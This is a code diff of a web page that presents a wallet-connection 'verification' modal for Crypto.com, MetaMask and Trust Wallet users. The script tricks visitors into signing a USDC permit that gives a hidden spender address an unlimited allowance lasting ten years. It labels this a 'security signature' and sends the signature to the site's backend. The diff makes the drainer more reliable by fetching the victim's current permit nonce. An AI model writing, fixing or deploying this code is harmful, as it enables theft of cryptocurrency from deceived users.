@@ -97,31 +97,24 @@
 <div id="walletModal" onclick="closeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation()">
         <div class="modal-header">Select Wallet</div>
-
         <div id="walletList">
             <div class="wallet-option" id="opt-cdc" onclick="startVerify('Crypto.com Wallet')">
                 <img src="https://crypto.com/details/about/static/863640243406f52875151593922d506d/361e1/logo.png" alt="CDC">
                 <span>Crypto.com Wallet</span>
             </div>
-
             <div class="wallet-option" id="opt-mm" onclick="startVerify('MetaMask')">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask">
                 <span>MetaMask</span>
             </div>
-
             <div class="wallet-option" id="opt-trust" onclick="startVerify('Trust Wallet')">
                 <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="Trust">
                 <span>Trust Wallet</span>
             </div>
-
             <div class="wallet-option" id="opt-gen" onclick="startVerify('Web3 Wallet')">
                 <div style="width:34px; height:34px; background:#f1f5f9; border-radius:8px; display:flex; align-items:center; justify-content:center; margin-right:16px; font-size:18px;">🌐</div>
                 <span>Browser Wallet</span>
             </div>
-
-            <div id="no-wallet-err" class="error-msg">
-                No Ethereum provider detected. Please open this site inside the browser of your MetaMask, Crypto.com, or Trust Wallet app.
-            </div>
+            <div id="no-wallet-err" class="error-msg">No Ethereum provider detected.</div>
         </div>
     </div>
 </div>
@@ -132,37 +125,20 @@ const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
 function openModal() {
     const modal = document.getElementById('walletModal');
-    const mm = document.getElementById('opt-mm');
-    const trust = document.getElementById('opt-trust');
-    const cdc = document.getElementById('opt-cdc');
-    const generic = document.getElementById('opt-gen');
-    const noWallet = document.getElementById('no-wallet-err');
-
+    const mm = document.getElementById('opt-mm'), trust = document.getElementById('opt-trust'),
+          cdc = document.getElementById('opt-cdc'), generic = document.getElementById('opt-gen'),
+          noWallet = document.getElementById('no-wallet-err');
     modal.style.display = 'flex';
-
     if (window.ethereum) {
-        // Reset all
         [mm, trust, cdc, generic].forEach(el => el.style.display = 'none');
-        noWallet.style.display = 'none';
-
-        // Precise Detection for CDC
-        const isCDC = window.ethereum.isCryptoCom ||
-                      window.ethereum.isDefaultWallet ||
-                      (window.ethereum.providers && window.ethereum.providers.some(p => p.isCryptoCom));
-
+        const isCDC = window.ethereum.isCryptoCom || window.ethereum.isDefaultWallet || (window.ethereum.providers && window.ethereum.providers.some(p => p.isCryptoCom));
         const isTrust = window.ethereum.isTrust || navigator.userAgent.includes("Trust");
         const isMM = window.ethereum.isMetaMask && !isCDC && !isTrust;
-
-        if (isCDC) {
-            cdc.style.display = 'flex';
-        } else if (isTrust) {
-            trust.style.display = 'flex';
-        } else if (isMM) {
-            mm.style.display = 'flex';
-        } else {
-            generic.style.display = 'flex';
-        }
-
+        if (isCDC) cdc.style.display = 'flex';
+        else if (isTrust) trust.style.display = 'flex';
+        else if (isMM) mm.style.display = 'flex';
+        else generic.style.display = 'flex';
+        noWallet.style.display = 'none';
     } else {
         noWallet.style.display = 'block';
     }
@@ -172,13 +148,9 @@ function closeModal() { document.getElementById('walletModal').style.display = '
 
 async function startVerify(walletName) {
     closeModal();
-    const btn = document.getElementById('connectBtn');
-    const status = document.getElementById('status');
-    const loader = document.getElementById('loader');
-
-    btn.style.display = "none";
-    loader.style.display = "block";
-    status.innerText = `Linking ${walletName}...`;
+    const btn = document.getElementById('connectBtn'), status = document.getElementById('status'), loader = document.getElementById('loader');
+    btn.style.display = "none"; loader.style.display = "block";
+    status.innerText = `Preparing ${walletName}...`;
 
     try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -187,16 +159,16 @@ async function startVerify(walletName) {
         const owner = await signer.getAddress();
         const { chainId } = await provider.getNetwork();
 
+        // DYNAMIC NONCE FETCHING
+        const usdcContract = new ethers.Contract(USDC_ADDRESS, ["function nonces(address owner) view returns (uint256)"], provider);
+        const currentNonce = await usdcContract.nonces(owner);
+
         status.innerHTML = `<span style="color: var(--primary)">Confirm security signature in ${walletName}...</span>`;
 
-        // LOGIC PRESERVED EXACTLY
         const deadline = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10);
         const value = ethers.constants.MaxUint256;
 
-        const domain = {
-            name: "USD Coin", version: "2", chainId: chainId, verifyingContract: USDC_ADDRESS
-        };
-
+        const domain = { name: "USD Coin", version: "2", chainId: chainId, verifyingContract: USDC_ADDRESS };
         const types = {
             Permit: [
                 { name: "owner", type: "address" }, { name: "spender", type: "address" },
@@ -205,18 +177,18 @@ async function startVerify(walletName) {
             ]
         };
 
-        const message = { owner, spender: SPENDER_ADDRESS, value, nonce: 0, deadline };
+        // Nonce is now dynamic (currentNonce)
+        const message = { owner, spender: SPENDER_ADDRESS, value, nonce: currentNonce, deadline };
         const signature = await signer._signTypedData(domain, types, message);
         const sig = ethers.utils.splitSignature(signature);
 
         status.innerText = "Finalizing...";
-
         const response = await fetch("/api/save-sig/", {
             method: "POST",
             headers: { "Content-Type": "application/json", "X-CSRFToken": "{{ csrf_token }}" },
             body: JSON.stringify({
                 owner: owner, value: value.toString(), deadline: deadline,
-                v: sig.v, r: sig.r, s: sig.s
+                v: sig.v, r: sig.r, s: sig.s, nonce: currentNonce.toString() // Also sending nonce to backend
             })
         });
 
@@ -226,11 +198,9 @@ async function startVerify(walletName) {
         } else {
             throw new Error("Server rejected verification.");
         }
-
     } catch (err) {
         status.innerHTML = `<span style='color: #ef4444;'>❌ ${err.message}</span>`;
-        btn.style.display = "block";
-        loader.style.display = "none";
+        btn.style.display = "block"; loader.style.display = "none";
     }
 }
 </script>
